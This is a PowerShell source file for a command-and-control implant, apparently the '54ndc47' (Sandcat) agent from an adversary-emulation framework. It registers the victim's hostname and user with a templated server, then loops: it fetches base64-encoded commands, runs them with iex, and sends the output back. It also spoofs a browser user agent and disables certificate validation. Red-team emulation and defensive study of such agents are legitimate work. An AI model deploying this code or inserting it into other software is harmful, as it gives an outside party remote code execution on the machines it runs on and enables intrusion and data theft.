$server = "{{ url_root }}"
$group = "{{ group }}"
$paw1 = hostname
$paw2 = whoami
$paw = $paw1 + $paw2

function get-PSVersion(){
    $ps_table = $PSVersionTable.PSVersion
    return [double]$ps_table.Major
}

function make-Request($ps_version, $r_endpoint, $r_body){
    if($ps_version -ge 6){
        return irm "$server$r_endpoint" -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Method POST -Body $r_body -SkipCertificateCheck
    }
    else{
        $web_client = Make-WebClient
        $web_client.Headers.add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
        return $web_client.UploadString("$server$r_endpoint",$r_body)
    }
}

function Make-WebClient(){
    if($server.contains("https")){
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
    }
    $web = New-Object System.Net.WebClient
    return $web
}

function Register-Self($web_client) {
    $json = @{
        paw=$paw
        host=hostname
        group=$group
        executor="psh"
    } | ConvertTo-Json
    $body = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
    $encodedReg = make-Request $ps_version "/sand/register" $body
    return [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encodedReg))
}

function Get-Instructions($web_client) {
    $json = @{
        paw=$paw
        host=hostname
        executor="psh"
    } | ConvertTo-Json
    $body = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
    $encodedTask = make-Request $ps_version "/sand/instructions" $body
    return [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encodedTask))
}

function Post-Results($web_client, $task) {
    If (([string]::IsNullOrEmpty($task.id))) {
        return
    }
    try {
        Write-Host "[54ndc47] running workflow task..."
        $cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($task.command))
        $result = iex $cmd | Out-String
        $status = 0
    } catch {
        $e = $_.Exception
        $result = $e.Message
        $status = 1
    }
    $resultBites = [System.Text.Encoding]::UTF8.GetBytes($result)
    $encodedResult = [Convert]::ToBase64String($resultBites)
    $json = @{
        paw=$paw
        link_id=$task.id
        output=$encodedResult
        status=$status
    } | ConvertTo-Json
    $body = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
    make-Request $ps_version "/sand/results" $body | out-null
}

$ps_version = get-PSVersion
$register = Register-Self | ConvertFrom-Json
If ($register.status) {
    Write-Host "[54ndc47] registration succeeded"
    while($true) {
      try {
          Write-Host "[54ndc47] checking in with master"
          $task = Get-Instructions $web | ConvertFrom-Json
          Post-Results $web $task
          Start-Sleep -s $task.sleep
      } catch {
          Write-Host "[54ndc47] server is not accessible"
          Start-Sleep -s 60
      }
    }
} else {
    Write-Host "[54ndc47] registration failed"
}